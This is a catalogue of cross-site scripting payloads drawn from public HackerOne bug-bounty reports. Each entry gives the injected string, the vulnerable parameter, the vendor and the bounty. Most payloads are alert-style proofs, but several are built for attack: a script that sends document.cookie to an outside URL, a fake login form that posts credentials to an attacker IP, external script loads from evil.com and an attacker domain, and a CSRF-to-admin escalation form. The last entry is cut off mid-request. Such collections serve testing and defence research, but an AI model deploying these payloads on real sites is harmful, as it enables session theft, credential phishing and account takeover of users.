— [\[target.com\] Reflected XSS at `oauth2/fallbacks/error` | ORY Hydra an OAuth 2.0 and OpenID Connect Provider](https://hackerone.com/reports/456333) · Eternal · [sudi](https://hackerone.com/sudi)


## Reflected XSS in oauth_callback parameter by URL‑encoded javascript: scheme followed by a script tag

### `f817c619`

```
javascript%3A%2F%2F"><script>alert(document.domain)</script>
```

**Parameter:** `oauth_callback`
— [XSS on OAuth authorize/authenticate endpoint](https://hackerone.com/reports/87040) · X / xAI · [filedescriptor](https://hackerone.com/filedescriptor)


## Reflected XSS via onauxclick attribute

### `2999c6c6`

```
* <h1 onauxclick=confirm(document.domain)>RIGHT CLICK HERE
```

— [Reflected - XSS](https://hackerone.com/reports/1779447) · MTN Group · [vidaamuyarchi](https://hackerone.com/vidaamuyarchi)


## Reflected XSS via onerror attribute injection

### `61ac00ff`

```
http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1
```

**Parameter:** `name`
— [Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)](https://hackerone.com/reports/1656627) · Ruby on Rails · [0b5cur17y](https://hackerone.com/0b5cur17y)


## reflected XSS via onfocus attribute injection in the 'a' query parameter

### `f742afdf`

```
https://www.█████/gri/ziptool/search.aspx?a=1simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo
```

**Parameter:** `a`
— [Reflected Xss in \[██████\]](https://hackerone.com/reports/1033253) · U.S. Dept Of Defense · [medblgsec](https://hackerone.com/medblgsec)


## Reflected XSS via open‑redirect, injecting a <script> payload through the "url" query parameter

### `493e1fc3`

```
http://95.213.191.146/r.php?url=http%3A%2F%2Fevil.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

**Parameter:** `url`
— [XSS at target.com](https://hackerone.com/reports/111365) · Automattic · [valievkarim](https://hackerone.com/valievkarim)


## Reflected XSS by passing a javascript: URI in the "auth" parameter

### `54305f12`

```
https://███████/en/embeddedAuthRedirect.html?auth=javascript:alert(
```

**Parameter:** `auth`
— [Reflected Xss](https://hackerone.com/reports/758854) · U.S. Dept Of Defense · [0xelkomy](https://hackerone.com/0xelkomy)


## Reflected XSS via payload query parameter used in cache poisoning

### `6b3b2f0c`

```
https://target.com/bugbounty/webcachedeception.php?url=https://evil.com/?cacheattack&payload=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&cache=60
```

**Parameter:** `payload`
— [Web Cache Deception Attack (XSS)](https://hackerone.com/reports/394016) · Discourse · [bobrov](https://hackerone.com/bobrov) · $256.0


## Reflected XSS via a POST body where the dbName parameter contains a <script>alert('xss');</script> payload

### `77ca7811`

```
_qf__install-db-form=&action=database&moreFieldsShown=&dbName=something<script>alert('xss');</script>&dbUser=root&dbPassword=roots&dbHost=localhost&dbType=mysql&dbLocal=0&dbPort=3306&dbTableType=MYISAM&dbTablePrefix=rv_&save=Continue+%C2%BB
```

**Parameter:** `dbName`
— [Reflected XSS in Step 2 of the Installation](https://hackerone.com/reports/170156) · Revive Adserver · [pavanw3b](https://hackerone.com/pavanw3b)


## Reflected XSS via the POST parameter q containing a crafted alert payload

### `f82adff3`

```
POST /search-solr.jspa HTTP/1.1
Host: target.com

q=%22-alert%28document.domain%29-%22
```

**Parameter:** `q`
— [\[target.com\] Search XSS](https://hackerone.com/reports/200034) · Informatica · [s_p_q_r](https://hackerone.com/s_p_q_r)


## Reflected XSS via q parameter using SVG onload

### `49290d22`

```
http://target.com/search/dev?q=<svg
```

**Parameter:** `q`
— [cross siite scripting in the blog ](https://hackerone.com/reports/77904) · target.com · [cyberboy](https://hackerone.com/cyberboy)


## Reflected XSS via the 'q' query parameter that is reflected into HTML without proper encoding

### `6f8e5f3c`

```
https://target.com/attendees/featured-attendees?q=rubyoob%27%3E%3Ciframe/onload=alert(document.domain
```

**Parameter:** `q`
— [Reflected xss on target.com](https://hackerone.com/reports/166699) · WebSummit · [rubyroobs](https://hackerone.com/rubyroobs)


## Reflected XSS via raw <script> tag injection in the emailbody parameter

### `757e3dc8`

```
0xd3adc0de<ScRiPt>alert('XSS Success!')</sCripT>
```

**Parameter:** `emailbody`
— [Reflected XSS in ██████](https://hackerone.com/reports/1873655) · U.S. Dept Of Defense · [0xd3adc0de](https://hackerone.com/0xd3adc0de)


## Reflected XSS via return_url parameter with a javascript: URI

### `acc40d79`

```
1-Go to             >.target.com/admin/authenticate?return_url=javascript:alert(100)//
```

**Parameter:** `return_url`
— [Reflected XSS on $Any$.target.com/admin](https://hackerone.com/reports/422707) · Shopify · [dr_dragon](https://hackerone.com/dr_dragon) · $1,500.0


## Reflected XSS via the ReturnUrl URL parameter containing a javascript: payload

### `283c383c`

```
https://target.com/account/signin?ReturnUrl=%19Jav%09asc%09ript%3ahttps%20%3a%2f%2fwww%2estarbucks%2ecom%2f%250Aalert%2528document.domain%2529
```

**Parameter:** `ReturnUrl`
— [Reflected Cross site Scripting (XSS) on target.com](https://hackerone.com/reports/438240) · Starbucks · [cujanovic](https://hackerone.com/cujanovic)


## Reflected XSS via the 's' query parameter with encoded Angular expression

### `7fc4671d`

```
https://target.com/?s=%26%23123%3B%26%23123%3Bconstructor.constructor%28%27alert%28document.domain%29%27%29%28%29%7D%7D&post_type=product
```

**Parameter:** `s`
— [\[target.com\] Reflected XSS](https://hackerone.com/reports/240256) · WordPress · [zeeshank](https://hackerone.com/zeeshank)


## Reflected XSS via <script>alert(1)</script> injected into the activationDate field of a JSON POST body

### `31c4f9d3`

```
{"id":"4","activationDate":"<script>alert(1)</script>"}
```

**Parameter:** `activationDate`
— [Stored XSS on target.com](https://hackerone.com/reports/2051085) · inDrive · [kristoferent](https://hackerone.com/kristoferent) · $284.0


## Reflected XSS via script src injection in the "location" query parameter

### `7cfb3863`

```
https://target.com/en/jobs-search.html?location=1%22%3E%3Cscript%20src=//evil.com/tpm?tpm_cb=alert%28document.domain%29%3E//
```

**Parameter:** `location`
— [csp bypass + xss](https://hackerone.com/reports/153666) · X / xAI · [b6117130df17feef13481e3](https://hackerone.com/b6117130df17feef13481e3)


## Reflected XSS via the "signup" request parameter

### `fd890885`

```
https://target.com/services/partners?signup=confirm(document.domain
```

**Parameter:** `signup`
— [XSS on https://target.com/](https://hackerone.com/reports/126539) · Shopify · [secalert](https://hackerone.com/secalert) · $500.0


## Reflected XSS via sort_col parameter injection

### `f50526b6`

```
http://target.com/sandbox/express/admin.php?/cp/members/bans&search=&sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
```

**Parameter:** `sort_col`
— [Reflective XSS](https://hackerone.com/reports/177943) · ExpressionEngine · [hogarth45](https://hackerone.com/hogarth45)


## Reflected XSS via SVG <svg> onload attribute injection

### `2d661418`

```
https://target.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1
```

**Parameter:** `dir`
— [Cross-site Scripting (XSS) in /updates-pro/archive/](https://hackerone.com/reports/235866) · target.com e.U. · [paulochoupina](https://hackerone.com/paulochoupina)


## Reflected XSS via term parameter using script tag breakout and SVG onload

### `37636bf4`

```
http://target.com/define.php?term=Lol%3C/script%3E%3Csvg%20onload=confirm%28document.domain%29%3E
```

**Parameter:** `term`
— [Reflective Xss Vulnerability ](https://hackerone.com/reports/80694) · Urban Dictionary · [alyssa_herrera](https://hackerone.com/alyssa_herrera)


## Reflected XSS through the "signup" request parameter

### `e4b2554d`

```
Page(function() {
Partners.VapSignupFunnel.partnerDashboardPageLoad(confirm(document.domain));
return {};
});
```

**Parameter:** `signup`
— [XSS on https://target.com/](https://hackerone.com/reports/126539) · Shopify · [secalert](https://hackerone.com/secalert) · $500.0


## Reflected XSS via </title> tag break and script tag injection

### `c8dcd7ae`

```
</title><script/src='https://target.com/hta3.js'>
```

**Parameter:** `p_title`
— [\[hta3\] Chain of ESI Injection & Reflected XSS leading to Account Takeover on \[███\]](https://hackerone.com/reports/1073780) · U.S. Dept Of Defense · [jr0ch17](https://hackerone.com/jr0ch17)


## Reflected XSS using Unicode‑escaped characters to inject img onerror

### `35cac2d0`

```
\u0022\u003e\u003cimg src=x onerror=alert(1)\u003e\u003cx y=\u0022
```

— [XSS on https://target.com/](https://hackerone.com/reports/979204) · Acronis · [yash_](https://hackerone.com/yash_)


## Reflected XSS via unsanitized JSONP callback parameter

### `ddfea8f6`

```
https://target.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E
```

**Parameter:** `callback`
— [Reflected Cross-Site Scripting in target.com/php/instagram_tag_relay](https://hackerone.com/reports/138262) · Eternal · [dejavuln](https://hackerone.com/dejavuln)


## Reflected XSS via URL fragment injection containing an encoded <script> payload

### `e1df77f1`

```
nextcloud/index.php/apps/gallery/#%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3Ejavascript:alert%280%29//%00
```

— [Reflected XSS in Gallery App](https://hackerone.com/reports/165686) · Nextcloud · [soreks](https://hackerone.com/soreks)


## Reflected XSS via URL path manipulation

### `dd624598`

```
https://target.com/'-alert(document.domain)-'
```

— [\[target.com\] 429 Too Many Requests Error-Page XSS](https://hackerone.com/reports/189768) · Quora · [bobrov](https://hackerone.com/bobrov)


## Reflected XSS via the `version` query parameter that injects an `<img onerror>` tag

### `cd8f0750`

```
http://target.com/files/glidownload/verify.asp?version=AC12%27%3E%3Cimg%20src=v%20onerror=alert(document.domain
```

**Parameter:** `version`
— [Reflected XSS on http://target.com/files/glidownload/verify.asp](https://hackerone.com/reports/859395) · Acronis · [ali](https://hackerone.com/ali)


## Reflected XSS via the x parameter by breaking out of a string literal and injecting alert(1)

### `bbd926ab`

```
https://target.com/videos/pop-up-shop?x=');alert(1)//
```

**Parameter:** `x`
— [target.com XSS on blog pages via sharing buttons](https://hackerone.com/reports/87168) · Shopify · [reactors08](https://hackerone.com/reactors08) · $500.0


## Reflected XSS via the 'x' query parameter injecting ${alert(1)}

### `2907d23c`

```
2. visit it:             >:<port>/poc.html?x=${alert(1)}
```

**Parameter:** `x`
— [One Click XSS in \[target.com\]](https://hackerone.com/reports/1563334) · Shopify · [comwrg](https://hackerone.com/comwrg)


## Scheme‑like title string bypass that results in a javascript: URI injection

### `5a56c284`

```
JavaScript::SubClassName.function_name
```

**Parameter:** `title`
— [Stored XSS in Wiki pages](https://hackerone.com/reports/526325) · GitLab · [ryhmnlfj](https://hackerone.com/ryhmnlfj)


## Script injection via HTML payload that steals document.cookies

### `7f83622f`

```
<script>document.write(document.cookies)</script>
```

— [Improper Implementation of SDK Allows Universal XSS in Webview Leading to Account Takeover](https://hackerone.com/reports/1455987) · EXNESS · [holyfield](https://hackerone.com/holyfield)


## Script tag injection by closing </script> and opening a new <script> in JSON rendered inside a <script> block

### `abdd7f4a`

```
<script>
//<![CDATA[
var json={"</script><script>alert(1)//":"xss"}
//]]>
</script>
```

— [JSON keys are not properly escaped](https://hackerone.com/reports/47280) · Ruby on Rails · [einstein_](https://hackerone.com/einstein_)


## script tag injection via deployment key title field

### `4f678da6`

```
test <script>alert(document.domain)</script>
```

**Parameter:** `title`
— [CSP-bypass XSS in project settings page](https://hackerone.com/reports/1588732) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Script tag injection via input title attribute XSS

### `d0af4a34`

```
<i class=gl-show-field-errors><input title="<script>alert(document.domain)</script>"/></i>
```

— [Stored-XSS injected in Wiki page via Banzai pipeline](https://hackerone.com/reports/2257080) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Script tag injection via JSON field (XSS)

### `62ab1a0f`

```
{
	"labels": [
		{
			"content": "<script>alert('SIKN')</script>",
			"typesetAsMath": false,
			...
		},
		...
	],
	...
}
```

— [XSS on using the legacy "Graphie To Png" API](https://hackerone.com/reports/2846011) · Khan Academy · [sikn](https://hackerone.com/sikn)


## Script tag injection loading external JavaScript (XSS)

### `4344e3b0`

```
<script src=alert.js></script
```

— [XSS on Issue reference numbers](https://hackerone.com/reports/831962) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Script tag injection (reflected XSS)

### `ba4d87f6`

```
<script>alert(document.domain)</script>
```

— [Reflected XSS on a Atavist theme](https://hackerone.com/reports/947790) · Automattic · [bugra](https://hackerone.com/bugra)


## Script tag injection (<script>alert(1)</script>)

### `82ee9b7b`

```
<script>alert(1);</script>
```

— [XSS in Asset name](https://hackerone.com/reports/133744) · Veris · [ashish_r_padelkar](https://hackerone.com/ashish_r_padelkar)


## Script tag injection in spreadsheet cell causing XSS when rendered

### `3d7301bc`

```
<script>alert(`xss!`)</script>
```

— [\[exceljs\] Possible XSS via cell value when worksheet is displayed in browser](https://hackerone.com/reports/356809) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## Script tag injection via URL parameter (XSS)

### `1f3436de`

```
https://███="><script>alert(1)</script>
```

— [Reflected XSS - https://███](https://hackerone.com/reports/1260823) · U.S. Dept Of Defense · [fiveguyslover](https://hackerone.com/fiveguyslover)


## Script tag injection XSS

### `f5a3d51d`

```
<script>alert(document.cookie);</script>
```

— [Image queue default key of 'None' and GraphQL unhandled type exception](https://hackerone.com/reports/996041) · Reddit · [moblig](https://hackerone.com/moblig) · $500.0


## Self XSS using image onerror injection

### `60b18fe8`

```
<img src=x onerror=alert(1)>
```

— [http://target.com/ Self XSS](https://hackerone.com/reports/14303) · Automattic · [smiegles](https://hackerone.com/smiegles)


## Self‑XSS via image URL with onload JavaScript

### `173a09bc`

```
https://target.com/avatar/█████████.png?;'onload=alert(document.domain)>
```

— [Self-XSS due to image URL can be eploited via XSSJacking techniques in review email](https://hackerone.com/reports/1397940) · Judge.me  · [penguinshelp](https://hackerone.com/penguinshelp)


## Self‑XSS by injecting a <script>debugger</script> tag into the city field

### `0b6f0e20`

```
<script>debugger</script>
```

**Parameter:** `city`
— [Self-XSS via location cookie city field when getting suggestions for a new location](https://hackerone.com/reports/166709) · Yelp · [haquaman](https://hackerone.com/haquaman)


## Self-XSS via malicious email address containing an iframe onload with eval of base64 payload

### `15dd2fdb`

```
"<iframe/onload=eval(atob(location.hash.substring(1)))>"@calc.sh
```

**Parameter:** `email`
— [target.com and evil.com ATO via XSS + Cookie Bridge](https://hackerone.com/reports/2089042) · Yelp · [lil_endian](https://hackerone.com/lil_endian)


## Self‑XSS with a script that repeatedly writes malicious text to the clipboard

### `55866c3b`

```
<script>
setInterval(function(){
    
    navigator.clipboard.writeText("PAYLOAD").then(function(text){console.log(text)});

},1000)
</script>
```

— [self-xss with ClickJacking can leads to account takeover in Firefox](https://hackerone.com/reports/892289) · Imgur · [keer0k](https://hackerone.com/keer0k)


## Stored/Blind XSS by breaking out of an attribute and injecting an external script tag

### `bdcb5b61`

```
email:  ██████████@yopmail.com
password: ███████
tempmail: https://target.com/?judgeme-███████████ ( it can be necessary when you are login )
payload: "><script src=https://yourxssdomain></script>
```

— [Blind XSS via Feedback form.](https://hackerone.com/reports/1339034) · Judge.me  · [b3hlull](https://hackerone.com/b3hlull)


## Stored cross-site scripting by injecting an <img> tag into the Full Name or Status Message fields.

### `0caaca9b`

```
<img src="https://target.com/u/99037623">
```

— [XSS in Desktop Client via user status and information](https://hackerone.com/reports/1707977) · Nextcloud · [b911bade858ce8e6a0f50f8](https://hackerone.com/b911bade858ce8e6a0f50f8)


## Stored JavaScript‑URI XSS executing code in the opener window

### `17ae2dba`

```
javascript:alert(window.opener.document.location)
```

— [Stored XSS for Grafana dashboard URL](https://hackerone.com/reports/684268) · GitLab · [xanbanx](https://hackerone.com/xanbanx)


## Stored/Reflected XSS by injecting a <script>alert(2);</script> tag

### `8854c6e3`

```
<script>alert(2);</script>
```

— [Unauthenticated Stored XSS on <any>.target.com via checkout page](https://hackerone.com/reports/189378) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)


## Stored/Reflected XSS via injection of a <script>alert('XSS')</script> tag

### `736f59da`

```
<script>alert('XSS')</script>
```

— [XSS in select attribute options](https://hackerone.com/reports/753567) · Concrete CMS · [sunny0day](https://hackerone.com/sunny0day)


## Stored XSS via <base> tag injection to rewrite the page base URL and load attacker script

### `3b5be6ed`

```
<pre data-sourcepos="&#34;%22 href=&#34;x&#34;></pre>
<base href=https://target.com>
<pre x=&#34;">
<code></code></pre>
```

— [Stored XSS in Notes (with CSP bypass for target.com)](https://hackerone.com/reports/1481207) · GitLab · [joaxcar](https://hackerone.com/joaxcar) · $13,950.0


## Stored XSS via CI configuration injection (GitLab CI YAML) with embedded payloads

### `242e60f0`

```
'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
  stage: build
  script: echo "hi"

'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
  stage: build
  script: echo "hi"

trigger-xss:
  stage: test
  script: e
```

— [XSS: `v-safe-html` is not safe enough](https://hackerone.com/reports/1579645) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Stored XSS via closing </textarea> and injecting a <script> that exfiltrates cookies

### `6e16fa9d`

```
</textarea>
<script>
    var i = document.createElement('img')
    i.src = 'https://target.com/?c=' + document.cookie;
    document.body.append(i);
</script>
```

— [Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload](https://hackerone.com/reports/247517) · Concrete CMS · [bl4de](https://hackerone.com/bl4de)


## Stored XSS via a crafted folder name containing HTML tags

### `1090f85f`

```
"><&#x2f;a><p><center><h1><strong>Important!<&#x2f;strong> Please go to target.com and relogin!<&#x2f;center><&#x2f;h1><&#x2f;p><!--
```

— [HTML injection in Desktop Client](https://hackerone.com/reports/206877) · ownCloud · [lukasreschke](https://hackerone.com/lukasreschke)


## Stored XSS via CSRF HTML form injecting <img onerror> in folder name

### `85b27675`

```
<html>
<body onload='document.forms[0].submit()'>
  <form method='POST' enctype='application/json' action='https://target.com/3/folders'>
    <input name='name' value='New Test"><img src=x onerror=prompt(2)>'>
    <input name='is_private' value='false'>
  </form>
</body>
</html>
```

**Parameter:** `name`
— [CSRF leads to a stored self xss](https://hackerone.com/reports/323005) · Imgur · [hogarth45](https://hackerone.com/hogarth45)


## Stored XSS delivering a malicious <script> payload

### `a9edd0b3`

```
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>
    <script>
        alert('Uh oh, I am bad, bad malware!!!')
    </script>
</body>

</html>
```

— [\[m-server\] HTML Injection in filenames displayed as directory listing in the browser allows to embed iframe with malicious JavaScript code](https://hackerone.com/reports/319794) · Node.js third-party modules · [bl4de](https://hackerone.com/bl4de)


## Stored XSS via direct <script> tag that runs alert and logs document data

### `1c1a85c4`

```
<script>
alert("XSS By Tiago")
console.log("Document:", document)
console.log("Window:", window)
console.log("Cookies:", document.cookie)
console.log("Location:", window.location)
console.log("CSRF Token:", document.querySelectorAll('[data-serialized-id="csrf"]')[0].innerText)
</script>
```

— [Inject page in admin panel via Shopify.API.pushState](https://hackerone.com/reports/662083) · Shopify · [tiago-danin](https://hackerone.com/tiago-danin) · $500.0


## Stored XSS by embedding `style` and `onanimationend` attributes in the user’s full name field

### `6ab023d8`

```
foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)
```

**Parameter:** `full_name`
— [Stored XSS in group issue list](https://hackerone.com/reports/859333) · GitLab · [mike12](https://hackerone.com/mike12) · $2,000.0


## Stored XSS using escaped characters to inject an <img> tag with an onerror handler

### `eec7bfe8`

```
http://█████.target.com/&quot;&gt;&lt;img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)


## Stored XSS executing alert(document.domain) from an external script loaded via a malicious src attribute

### `2aaabbd0`

```
alert(document.domain)
```

— [Stored XSS on target.com](https://hackerone.com/reports/85488) · Vimeo · [stefanovettorazzi](https://hackerone.com/stefanovettorazzi)


## Stored XSS via filename injection

### `2b5c8b61`

```
"><svg onload=alert(3);
```

— [\[public\] Stored XSS in the filename when directories listing](https://hackerone.com/reports/329950) · Node.js third-party modules · [tungpun](https://hackerone.com/tungpun)


## Stored XSS via form field (name) containing "><img src=x onerror=alert(document.domain)>

### `28ef61e1`

```
3. On the name, enter payload: **"><img src=x onerror=alert(document.domain)>**
```

**Parameter:** `name`
— [Stored XSS on reports.](https://hackerone.com/reports/485748) · X / xAI · [giddsec](https://hackerone.com/giddsec) · $700.0


## Stored XSS using a hidden iframe with an onload alert

### `217c8f00`

```
<iframe onload="alert(██████)" style="display:none"></iframe>
```

— [███ on https://████ enable ███ scraping, injection, stored XSS](https://hackerone.com/reports/1048571) · U.S. Dept Of Defense · [skarsom](https://hackerone.com/skarsom)


## Stored XSS via HTML entity‑encoded injection of an <img> tag with an onerror handler

### `ad9b336c`

```
http://████████.target.com/&amp;quot;&amp;gt;&amp;lt;img+src=z+onerror=console.log(
```

— [Stored XSS on the "target.com/extras-widgets" url at "Recent comments by" module with malicious blog url](https://hackerone.com/reports/1083734) · Automattic · [superpan](https://hackerone.com/superpan)


## Stored XSS using an HTML‑escaped <img> tag with onerror attribute in a map marker title

### `7a765de4`

```
&lt;img src=x onerror=alert(1) "
```

**Parameter:** `title`
— [Stored Cross-Site Scripting in Map Share Page](https://hackerone.com/reports/65284) · Mapbox · [hussain_0x3c](https://hackerone.com/hussain_0x3c)


## Stored XSS via HTML injection of <img> tag in JSON field 'id' and JavaScript URL in 'url'

### `bda19453`

```
{
   "id": "<img src=# height=10000 width=10000>",
   "url": "javascript:alert(document.domain)"
}
```

— [XSS in ZenTao integration affecting self hosted instances without strict CSP](https://hackerone.com/reports/1542510) · GitLab · [joaxcar](https://hackerone.com/joaxcar) · $13,950.0


## Stored XSS using an iframe with srcdoc containing an img onerror alert

### `b1c601e0`

```
<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe>
```

— [CVE-2019-19935 - DOM based XSS in the froala editor](https://hackerone.com/reports/938683) · lemlist · [chackal](https://hackerone.com/chackal)


## Stored XSS via image tag in network name field

### `cd9ae478`

```
Step 1: Login to target.com
Step 2: Connect latest unifi controller with target.com via cloud access.
Step 3: Create site with any name in that controller.
Step 4: Click on launch site in target.com then you will again redirect to target.com with controls.
Step 5: Create Network with xss payload "><img src=x onerror=prompt(document.cookie)>
Step 6: XSS will execute.
```

— [Stored XSS in target.com](https://hackerone.com/reports/142084) · Ubiquiti Inc. · [b7882330c6060c6b277c5a1](https://hackerone.com/b7882330c6060c6b277c5a1)


## Stored XSS via <img src=x onerror=alert(1)> injection in an email input

### `5d12a1b2`

```
your_email@gmail.com"><img src=x onerror=alert(1);>
```

— [Reflected XSS - in Email Input](https://hackerone.com/reports/799839) · U.S. Dept Of Defense · [ahmd_halabi](https://hackerone.com/ahmd_halabi)


## Stored XSS injected into a custom attribute field

### `6764a752`

```
"><IMG src=x onerror=prompt(1);>"">><marquee><img src=x onerror=confirm(3)></marquee>"/
```

— [Stored XSS in target.com In Client Custom Attribute ](https://hackerone.com/reports/275515) · Ubiquiti Inc. · [khizer47](https://hackerone.com/khizer47)


## Stored XSS via injected onmouseover attribute in an anchor tag

### `aec49bf5`

```
<a href="#" title=" target='abc' rel= onmouseover=alert(/XSS/) ">This is a PoC for a Stored XSS</a>
```

— [Potential unprivileged Stored XSS through wp_targeted_link_rel](https://hackerone.com/reports/509930) · WordPress · [simonscannell](https://hackerone.com/simonscannell)


## Stored XSS by injecting alert(1) into a field that is later rendered

### `b62ca76b`

```
alert(1)
```

— [Stored XSS in \[shop\].target.com/admin/orders/\[id\]](https://hackerone.com/reports/214044) · Shopify · [zombiehelp54](https://hackerone.com/zombiehelp54)


## Stored XSS injecting a fake login form for credential theft

### `174b0a4d`

```
<h3>Please login to proceed</h3><form action=http://attackerIP>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```

— [Stored XSS via Comment Form at ████████](https://hackerone.com/reports/915073) · U.S. Dept Of Defense · [z32](https://hackerone.com/z32)


## Stored XSS by injecting malicious CSS/JS into the .git/config email field

### `2df0ff5c`

```
[user]
	name = anyname
	email = "#' style=animation-name:blinking-dot onanimationstart=alert(document.domain) other"
```

**Parameter:** `email`
— [Stored-XSS on wiki pages](https://hackerone.com/reports/1087061) · GitLab · [yvvdwf](https://hackerone.com/yvvdwf)


## Stored XSS injecting an onmouseover attribute that calls confirm(document.domain)

### `6a47112e`

```
" onmouseover="confirm(document.domain)" a="
```

— [Stored XSS in target.com](https://hackerone.com/reports/928816) · lemlist · [solov9ev](https://hackerone.com/solov9ev)


## Stored XSS via a <javascript:...> tag injected into the profile statement

### `31613e35`

```
<javascript:alert(document.cookie)>
```

**Parameter:** `statement`
— [Stored XSS On Statement](https://hackerone.com/reports/84740) · Gratipay · [ibram](https://hackerone.com/ibram)


## Stored XSS via JavaScript URL injection in promo_code JSON field

### `0f2b4377`

```
{"name": "Test HackerOne", "start_date": "01.01.2018", "leanplum_id": "test", "rides": "200", "places": "20", "distance": 500, "cancel_times": "0", "days": "100", "promo_code": "javascript://target.com/test%0aalert(document.domain)", "prf_reward": "10"}
```

**Parameter:** `promo_code`
— [\[target.com\] Reflected XSS via Base64-encoded "q" param on "my.html" Valentine's microsite](https://hackerone.com/reports/320679) · Grab · [ysx](https://hackerone.com/ysx)


## Stored XSS via Less code that injects a back‑ticked `confirm('XSS')` call in custom CSS

### `c66da288`

```
confirm('XSS')\
```

— [Stored XSS in TSVB Visualizations Markdown Panel](https://hackerone.com/reports/858874) · Elastic · [jeremybuis](https://hackerone.com/jeremybuis)


## Stored XSS using malformed iframe and javascript: URL in comment/post body

### `110247fa`

```
<iframe <><a href=javascript&colon;alert(document.cookie)>Click Here</a>=&gt;&lt;/iframe&gt;
```

— [Stored XSS in target.com](https://hackerone.com/reports/733248) · Automattic · [adhamsadaqah](https://hackerone.com/adhamsadaqah)


## Stored XSS using malformed tags and an SVG onload attribute to execute JavaScript

### `12a10cb4`

```
</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=prompt(document.cookie)//>\x3e
```

**Parameter:** `txtCode`
— [\[target.com\] XSS Reflected POST-Based on update/tumblr2/{$id}](https://hackerone.com/reports/1040639) · Automattic · [fuzzme](https://hackerone.com/fuzzme)


## Stored XSS via malicious asset name containing </script><script>alert(1)</script>

### `f64bec35`

```
{
  "outputPath": "./dist",
  "assets": [
    {
      "name": "</script><script>alert(1)</script>main.js",
      "chunks": [0],
      "chunkNames": ["main"]
    }
  ]
}
```

— [\[webpack-bundle-analyzer\] Cross-site Scripting](https://hackerone.com/reports/463380) · Node.js third-party modules · [ermilov](https://hackerone.com/ermilov)


## Stored XSS via a malicious <script> tag placed in a WordPress template comment (Template Name)

### `0bb162ee`

```
/* Template Name: <script>confirm(document.cookie);</script> */
```

**Parameter:** `Template Name comment`
— [Authenticated Cross-site Scripting in Template Name](https://hackerone.com/reports/220903) · WordPress · [zurke](https://hackerone.com/zurke)


## Stored XSS via malicious username input

### `7c01cfb9`

```
1. Set your own username as "<img src=x onerror=alert(document.domain)> foo / bar"
```

**Parameter:** `username`
— [XSS (Persistent) - Selecting role(s) for protected branches](https://hackerone.com/reports/346111) · GitLab · [phillycheeze](https://hackerone.com/phillycheeze)


## Stored XSS via markdown image with a javascript: URL payload

### `a6cc20f6`

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify Search Form</title>
</head>
<body>
    Please hold...
    
    <form id="post-form" action="https://target.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">
        <input type="hidden" name="query" value="Is this XSS?">
        <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...]
```

**Parameter:** `greeting`
— [Reflected XSS in AI Chat Bot Greetings at target.com via Markdown Image Rendering](https://hackerone.com/reports/2509022) · Shopify · [saltymermaid](https://hackerone.com/saltymermaid) · $1,600.0


## Stored XSS using a markdown link with a javascript: URI in the profile statement

### `66df37e2`

```
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
```

**Parameter:** `statement`
— [Stored XSS On Statement](https://hackerone.com/reports/84740) · Gratipay · [ibram](https://hackerone.com/ibram)


## Stored XSS via meme macro syntax with onerror JavaScript execution

### `ba92d1a4`

```
{meme, src= http://dummy//onerror=eval(prompt(1))// }
```

— [XSS in editor by any user](https://hackerone.com/reports/18691) · Phabricator · [tunnelshade](https://hackerone.com/tunnelshade) · $1,000.0


## Stored XSS via merge_request[source_branch] parameter containing an img onerror payload

### `d639f1ab`

```
<img/src=x onerror=alert(1)>
```

**Parameter:** `merge_request[source_branch]`
— [Stored XSS in merge request pages](https://hackerone.com/reports/409380) · GitLab · [8ayac](https://hackerone.com/8ayac)


## Stored XSS via message body containing <iframe src=javascript:alert(1)>

### `99244b35`

```
Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>
```

**Parameter:** `message`
— [Stored XSS in Private Message component (BuddyPress)](https://hackerone.com/reports/487081) · WordPress · [klmunday](https://hackerone.com/klmunday)


## Stored XSS via the message[content] multipart form field in email forwarding

### `a4ab2c4e`

```
POST /messages HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html; page-update, text/html, application/xhtml+xml
Accept-Language: ar,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://target.com/entries/[]/forwards/new
X-CSRF-Token: []
